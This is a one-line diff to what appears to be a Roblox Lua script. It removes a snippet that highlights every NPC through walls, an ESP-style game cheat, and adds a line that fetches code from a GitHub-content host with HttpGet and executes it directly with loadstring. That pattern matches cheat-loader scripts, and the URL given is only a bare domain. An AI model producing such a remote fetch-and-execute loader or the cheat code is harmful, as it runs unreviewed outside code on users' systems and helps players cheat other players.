@@ -1,1 +1,1 @@
-task.spawn(function() local f=workspace:WaitForChild("NPCs",10) if f then for _,n in ipairs(f:GetChildren()) do if n:IsA("Model") and not n:FindFirstChild("NPC_ESP") then local h=Instance.new("Highlight") h.Name="NPC_ESP" h.FillTransparency=0.5 h.OutlineTransparency=0 h.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop h.Parent=n end end end end)
+loadstring(game:HttpGet("https://githubusercontent.com"))()
